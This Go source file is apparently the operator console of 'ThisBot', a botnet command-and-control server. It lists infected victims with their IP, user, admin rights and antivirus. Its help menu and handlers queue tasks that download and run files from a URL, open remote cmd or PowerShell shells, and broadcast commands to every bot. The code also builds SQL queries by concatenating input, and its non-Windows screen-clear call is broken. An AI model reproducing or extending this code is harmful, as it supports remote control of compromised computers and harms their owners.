package main

import (
	"ThisBot/common"
	"ThisBot/config"
	"ThisBot/db1"
	"ThisBot/utils"
	"bufio"
	"database/sql"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	_ "github.com/go-sql-driver/mysql"
)

func show_banner() {
	var banner string = "\n" + `___________.__    .__       __________        __ ` + "\n" +
		`\__    ___/|  |__ |__| _____\______   \ _____/  |_ ` + "\n" +
		`  |    |   |  |  \|  |/  ___/|    |  _//  _ \   __\` + "\n" +
		`  |    |   |   Y  \  |\___ \ |    |   (  <_> )  |  ` + "\n" +
		`  |____|   |___|  /__/____  >|______  /\____/|__|  ` + "\n" +
		`  	        \/        \/        \/             ` + common.Version + "\n" +
		"                                                   Author: Nec0Arc" + "\n"
	fmt.Println(banner)
}

func help_handler() {
	fmt.Println("1. help/h: Show help menu")
	fmt.Println("2. exec path/url [args]: Execute executable file or download from host and execute")
	fmt.Println("3. cmd/pws: Remote cmd or powershell")
	fmt.Println("4. list: Show all bots")
	fmt.Println("5. info id: Show bot info which ID is id")
	fmt.Println("6. select botid: Select a connected bot to operate")
	fmt.Println("7. clear: Clean the screen")
	fmt.Println("8. mode [broadcast]: Show current mode or switch to broadcast")
}

func select_handler(ary []string) {
	if len(ary) < 2 {
		fmt.Println("Usage: select botid, please enter help command")
		return
	}
	// Check it's a number
	botid, err := strconv.ParseInt(ary[1], 10, 64)
	if err != nil || botid == 0 {
		fmt.Println("You need to enter a bot id which is number")
		return
	}
	// Check if bot in database record
	var bot common.Client
	if get_bot_info(botid, &bot) == false {
		fmt.Println("[-] Bot doesn't exist, please enter right bot id")
		return
	}
	// Switch mode
	common.CurrentBot = botid
	var mu sync.Mutex

	mu.Lock()
	fmt.Println("🐾 --------------------------------------------------- 🐾")
	fmt.Println("⚔️⚔️⚔️  Currrent bot: ")
	fmt.Println("🐾 --------------------------------------------------- 🐾")
	fmt.Printf("👣 ID: %d\n", botid)
	fmt.Println("🏴 Guid: " + bot.Guid)
	fmt.Println("🌍 IP: " + bot.Ip)
	fmt.Println("👽 Who: " + bot.Whoami)
	fmt.Println("💻 OS: " + bot.Os)
	install, _ := strconv.ParseInt(bot.Installdate, 10, 64)
	t := time.UnixMilli(install)
	fmt.Println("📅 InstallDate: " + t.Format("2006-01-02 15:04:05"))
	admin := "yes"
	if bot.Isadmin != admin {
		admin = "no"
	}
	fmt.Println("👽 Admin: " + admin)
	fmt.Println("😈 Anti-Virus: " + bot.Antivirus)
	fmt.Println("🤖 CPU: " + bot.Cpuinfo)
	fmt.Println("🎭 GPU: " + strings.TrimSpace(bot.Gpuinfo))
	lastseen, _ := strconv.ParseInt(bot.Lastseen, 10, 64)
	t = time.UnixMilli(lastseen)
	fmt.Println("🔬 Lastseen: " + t.Format("2006-01-02 15:04:05"))
	fmt.Println("👾 Version: v" + bot.Version)
	fmt.Println("🐾 --------------------------------------------------- 🐾")
	mu.Unlock()
}

func exec_handler(ary []string) {
	if len(ary) < 2 {
		fmt.Println("Usage: exec path/url [args], please enter help command")
		return
	}
	var options string = ""
	for i := 1; i < len(ary); i++ {
		options += " " + ary[i]
	}
	options = strings.TrimSpace(options)
	// Complete the command
	if strings.ToLower(ary[0]) == "exec" {
		ary[0] = "execute"
	}
	// Query if there's command in database
	sqlStr := "select id from commands where name='" + ary[0] + "'"

	command_id := 0
	err := db1.QueryRow(common.Db, sqlStr).Scan(&command_id)
	if err != nil {
		if err == sql.ErrNoRows {
			fmt.Println("No such command")

		} else {
			fmt.Println("Command error")
		}
		return
	}

	sqlStr = "insert into tasks (bot_id, command_id, args, status) values (?,?,?,?)"
	map_args := map[string]interface{}{
		"args":   options,
		"hidden": "false",
	}
	byt, _ := json.Marshal(map_args)
	_, err = db1.Insert(common.Db, sqlStr, common.CurrentBot, command_id, byt, "queued")
	if err != nil {
		fmt.Println("[-] Failed to generate command")
		return
	} else {
		fmt.Println("[+] Generate command okay")
	}
}

func info_handler(ary []string) {
	if len(ary) < 2 {
		fmt.Println("[-] Usage: info id, request latest bot information")
		return
	}
	// TODO
}

func get_bot_info(botid int64, bot *common.Client) bool {
	// Check if bot in database record
	sqlStr := "select guid, ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastseen from clients where id='" + strconv.FormatInt(botid, 10) + "'"
	err := db1.QueryRow(common.Db, sqlStr).Scan(&bot.Guid, &bot.Ip, &bot.Whoami, &bot.Os, &bot.Installdate, &bot.Isadmin, &bot.Antivirus, &bot.Cpuinfo, &bot.Gpuinfo, &bot.Version, &bot.Lastseen)
	if err != nil {
		return false
	}

	bot.Id = int(botid)
	return true
}

func mode_handler(ary []string) {
	if len(ary) == 1 {
		if common.CurrentBot == 0 {
			fmt.Println("[+] Broadcast mode")
		} else {
			fmt.Println("[+] Current bot ID: " + strconv.FormatInt(common.CurrentBot, 10))
		}
	} else {
		if ary[1] == "broadcast" {
			common.CurrentBot = 0
			fmt.Println("[+] Switch to broadmode")
		} else {
			fmt.Println("[-] Failed to switch to broadcast mode")
		}
	}
}

func list_handler() {
	sqlStr := "select * from clients"
	var bot common.Client
	rows, err := db1.QueryRows(common.Db, sqlStr)
	if err != nil {
		log.Println(err.Error())
		return
	}
	fmt.Printf("id | guid | token | ip | whoami | os | installdate | isadmin | antivirus | cpuinfo | gpuinfo | clientversion | lastseen | lastcommand |\n")
	for rows.Next() {
		rows.Scan(&bot)
		fmt.Printf("%d %s %s %s %s %s %s %s %s %s %s %s %s %s\n",
			bot.Id, bot.Guid, bot.Token, bot.Ip, bot.Whoami, bot.Os, bot.Installdate, bot.Isadmin,
			bot.Antivirus, bot.Cpuinfo, bot.Gpuinfo, bot.Version, bot.Lastseen, bot.Lastcommand)
	}
}

func clear_handler() {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	} else {
		cmd = exec.Command("cmd")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func main() {
	if len(os.Args) > 1 && os.Args[1] == "--init-config" {
		err := config.GenerateDefaultConfig(common.ConfigDefaultFileName)
		if err != nil {
			log.Fatal("config.GenerateDefaultConfig failed")
			return
		}
		log.Println("Generate default configure file successfully, please check it and restart the server")
		return
	}

	// Check the configure file exists or not
	config_path, _ := os.Getwd()
	config_path = path.Join(config_path, common.ConfigDefaultFileName)
	if !utils.FileExist(config_path) {
		log.Fatal("Can't find configure file, please add --init-config option to generate it first")
		return
	}
	// Load config
	pCfg := config.LoadConfig(config_path)
	if pCfg == nil {
		log.Fatal("Failed to load configure file")
		return
	}
	common.Cfg = *pCfg

	// Initialize all
	config.Init(&common.Cfg)

	if len(os.Args) > 1 && os.Args[1] == "--init-commands" {
		db1.InitCommands(common.Db)
	}

	// Running the task cleaner
	task_cleaner(common.Db, 5*60)
	// Running the server
	go Server()

	time.Sleep(1000)

	// Running command panel
	var command string = ""
	show_banner()
	for {
		fmt.Print("$ ")
		command, _ = bufio.NewReader(os.Stdin).ReadString('\n')
		command = strings.TrimSpace(command)
		if command == "" {
			continue
		}
		cmdAry := strings.Fields(command)

		switch cmdAry[0] {
		case "select", "s":
			select_handler(cmdAry)
		case "list", "l":
			list_handler()
		case "help", "h":
			help_handler()
		case "exec":
			exec_handler(cmdAry)
		case "clear":
			clear_handler()
			show_banner()
		case "info":
			info_handler(cmdAry)
		case "mode":
			mode_handler(cmdAry)
		}

	}

}
